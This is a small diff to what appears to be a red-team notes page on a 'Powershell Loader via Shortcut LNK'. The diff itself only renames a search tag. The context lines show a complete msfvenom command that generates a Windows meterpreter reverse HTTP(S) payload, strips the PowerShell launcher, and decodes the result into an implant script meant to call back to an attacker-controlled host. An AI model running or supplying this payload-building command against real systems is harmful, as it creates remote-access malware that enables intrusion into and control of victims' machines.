@@ -1,6 +1,6 @@
 # Powershell Loader via Shortcut LNK
 
-Search Tag(s): #initial-foothold #defense-evasion #windows #scenarios
+Search Tag(s): #initial-access #defense-evasion #windows #scenarios
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | basenc -d --base64 > implant.ps1
